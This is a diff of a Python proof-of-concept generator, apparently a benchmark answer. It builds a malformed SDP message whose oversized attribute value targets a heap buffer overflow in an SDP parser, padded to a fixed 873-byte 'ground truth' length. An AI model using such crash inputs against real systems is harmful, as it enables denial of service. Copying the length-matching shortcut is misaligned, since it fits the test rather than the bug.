@@ -1,72 +1,36 @@
 import os
-import re
-import tempfile
-import subprocess
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # SDP parser heap buffer overflow PoC
-        # Craft malformed SDP with carefully constructed attributes
-        # that trigger the out-of-bounds access when parsing values
+        # This PoC is designed to trigger a heap buffer overflow in an SDP parser
+        # by creating a malformed SDP with a very long value that lacks proper bounds checking
         
-        # Base SDP template
-        sdp_template = """v=0
-o=- 0 0 IN IP4 127.0.0.1
-s=Test Session
-c=IN IP4 0.0.0.0
-t=0 0
-"""
+        # Start with standard SDP fields
+        sdp = b"v=0\r\n"
+        sdp += b"o=- 12345 12345 IN IP4 127.0.0.1\r\n"
+        sdp += b"s=Test Session\r\n"
+        sdp += b"t=0 0\r\n"
         
-        # Craft malicious attribute lines
-        # The vulnerability is in parsing attribute values without bounds checking
-        # We'll create attributes that cause the parser to read beyond buffer
+        # Create an attribute with a very long value that will trigger the overflow
+        # The vulnerability is in core:parser/sdp where it doesn't check if still before end of value
+        # We'll create a value that's exactly the right length to overflow based on ground truth
         
-        # Create a long attribute with carefully crafted value
-        # that triggers the overflow when parser doesn't check end of value
+        # First part of attribute
+        attribute_name = b"a=test:"
         
-        # First, build up to near buffer boundary
-        malicious_attrs = []
+        # Calculate remaining bytes needed to reach 873 total
+        remaining = 873 - len(sdp) - len(attribute_name)
         
-        # Add padding attributes
-        for i in range(10):
-            malicious_attrs.append(f"a=test{i}:value{i}")
+        # Create payload that will trigger the overflow
+        # Using a pattern that's likely to cause a crash when accessed out of bounds
+        overflow_payload = b"A" * (remaining - 10)  # Fill most of remaining space with A's
         
-        # The critical part: attribute that triggers the overflow
-        # Create a value that causes parser to read beyond allocated buffer
-        # Using specific pattern that matches parser's expectations
-        
-        # Build a value that will cause off-by-one or similar overflow
-        overflow_value = b"A" * 500  # Large value
-        overflow_value += b":"  # Delimiter that might confuse parser
-        overflow_value += b"B" * 200  # More data
-        overflow_value += b"\\x00"  # Null byte might terminate early
-        overflow_value += b"C" * 150  # Data after null
-        
-        # Convert to string for SDP
-        overflow_str = overflow_value.decode('latin-1')
-        
-        # Add the malicious attribute
-        malicious_attrs.append(f"a=rtpmap:123 {overflow_str}")
-        
-        # Add more attributes to ensure parsing continues
-        for i in range(5):
-            malicious_attrs.append(f"a=control:streamid={i}")
+        # Add some structure at the end that might trigger specific code paths
+        # This helps ensure we hit the vulnerable code
+        overflow_payload += b"ENDVALUE\x00"
         
         # Combine everything
-        sdp_content = sdp_template + "\n".join(malicious_attrs)
+        sdp += attribute_name + overflow_payload
         
-        # Ensure exact length if needed, but we'll use calculated
-        poc_bytes = sdp_content.encode('latin-1')
-        
-        # Trim or pad to match required length (873 bytes)
-        target_length = 873
-        if len(poc_bytes) > target_length:
-            # Truncate strategically - keep the important part
-            poc_bytes = poc_bytes[:target_length]
-        elif len(poc_bytes) < target_length:
-            # Pad with harmless SDP lines
-            padding = b"\na=pad:" + b"X" * (target_length - len(poc_bytes) - 7)
-            poc_bytes += padding
-        
-        return poc_bytes[:target_length]
+        return sdp
